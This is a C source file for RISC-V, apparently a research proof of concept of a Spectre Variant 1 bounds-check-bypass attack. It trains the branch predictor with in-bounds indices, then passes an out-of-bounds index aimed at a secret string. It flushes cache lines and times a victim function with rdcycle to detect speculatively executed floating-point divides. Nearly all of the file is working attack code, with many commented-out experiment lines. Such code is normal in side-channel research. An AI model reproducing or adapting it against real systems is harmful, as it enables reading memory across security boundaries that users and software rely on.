#include <stdio.h>
#include <stdint.h> 
#include "encoding.h"
#include "cache.h"

#define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
#define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS 2 // amount of times to attack the same index
#define SECRET_SZ 1
#define CACHE_HIT_THRESHOLD 60

volatile uint64_t array1_sz = 16;
volatile uint8_t unused1[64];
volatile uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
volatile uint8_t unused2[64];
volatile uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
volatile uint8_t unused3[64];
volatile uint8_t array3[160] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35};
volatile char* secretString = "h";

/**
 * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
 * corresponding values) in the inArray array that has the highest values.
 *
 * @input inArray array of values to find the top two maxs
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */


/**
 * takes in an idx to use to access a secret array. this idx is used to read any mem addr outside
 * the bounds of the array through the Spectre Variant 1 attack.
 *
 * @input idx input to be used to idx the array
 */
volatile uint64_t resultt[256];
volatile float aaa = 1.31;
volatile float bbb = 21.24;
volatile float ccc[10] = {1.2 ,3.2, 4.2, 5.4, 2.1, 1.2, 2.3, 4.2, 3.2, 5.6};
volatile uint64_t x1 = 0;
volatile uint64_t x2 = 0;
#pragma GCC push_options
#pragma GCC optimize("O1")
void victimFunc(uint64_t idx, int i){
    x1 = rdcycle();
    volatile uint8_t dummy = 2;
    // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
    array1_sz =  8238378738;
    asm("fcvt.s.lu	fa6, %[in]\n"
        "fcvt.s.lu	fa7, %[inout]\n"
        //"fsqrt.s	fa7, fa7, rne\n"
        //"fsqrt.s	fa7, fa7, rne\n"
        //"fsqrt.s fa7, fa7, rne\n"
        //"fsqrt.s fa7, fa7, rne\n"
        //"fsqrt.s fa7, fa7, rne\n"
        //"fsqrt.s fa7, fa7, rne\n"
        "fsqrt.s	fa7, fa7, rne\n"
        "fsqrt.s	fa7, fa7, rne\n"
        "fsqrt.s	fa7, fa7, rne\n"
        "fsqrt.s	fa7, fa7, rne\n"
        "fsqrt.s	fa7, fa7, rne\n"
        "fsqrt.s	fa7, fa7, rne\n"
        "fcvt.lu.s	%[out], fa7, rtz\n"
	: [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (dummy)
        : "fa6", "fa7");
        
    
    if (idx < array1_sz){
        if(array3[array1[idx]] == i){
           /*   aaa = 2*bbb;
              bbb = 2*bbb;
              aaa = aaa*bbb;
              bbb = aaa*bbb;
              aaa += 2.0;
            *///aaa = bbb/aaa; 
            //asm("li t1,7");
            //asm("li a5,32343453");
            //asm("fcvt.s.lu      fa5, t2\n");
            asm("fcvt.s.lu      fa4, a5\n");
          //  asm("fsqrt.s        fa5, fa4, rne\n");
            asm("fdiv.s fa5, fa5, fa4\n");
          //  asm("fsqrt.s        fa5, fa5, rne\n");
          //  asm("fsqrt.s        fa5, fa5, rne\n");
          //  asm("fsqrt.s        fa5, fa5, rne\n");
      //      asm("fsqrt.s        fa5, fa4, rne\n");
            /*ccc[0] = bbb/aaa;
            aaa = ccc[0]/bbb;
            bbb = ccc[1]/aaa;
            volatile int temp;
            temp = ccc[3];
            aaa = ccc[2];*/
           // ccc[0] = aaa;
           // ccc[1] = bbb;
           // ccc[2] = aaa / bbb * 2.3;
           // ccc[3] = aaa*bbb/2.3*4.5;
           // ccc[4] = aaa/bbb*3.1;
          //  ccc[5] = aaa+bbb/3;
          //  ccc[6] = bbb/aaa*1.2;
        }
       
    }
    x2 = rdcycle() - x1;
    
    // bound speculation here just in case it goes over
    dummy = rdcycle();
    printf("%d:%d ",i,x2);
}
#pragma GCC pop_options

int main(void){
    volatile uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    volatile uint64_t start, diff, passInIdx, randIdx;
    volatile uint8_t dummy = 0;
    volatile static uint64_t results[256];
    for(int i=0; i<160; i++) array3[i] = i;
    

        for(volatile int i=100;i<110;i++){
            // make sure array you read from is not in the cache
            //flushCache((uint64_t)ccc, sizeof(ccc));
           // test = 7;
          //  printf("test2:%d\n",test);
            for(volatile int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
                // avoid jumps in case those tip off the branch predictor
                // note: randIdx changes everytime the atkRound changes so that the tally does not get affected
                //       training creates a false hit in array2 for that array1 value (you want this to be ignored by having it changed)
                randIdx = 0 % array1_sz;
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 

                //flushCache((uint64_t)array3, sizeof(array3));
                flushCache((uint64_t)aaa, sizeof(aaa));
                flushCache((uint64_t)bbb, sizeof(bbb));
                flushCache((uint64_t)array1_sz, sizeof(array1_sz));
                // set of constant takens to make the BHR be in a all taken state
                for(volatile uint64_t k = 0; k < 300; ++k){
                    asm("");
                }
    
                // call function to train or attack
                victimFunc(passInIdx,i);
                //test++;
            }
          
            printf("\n");
       
         }
    //     for(int k=100; k<110; k++) printf("%d:%d\n",k,resultt[k]);
    return 0;
}



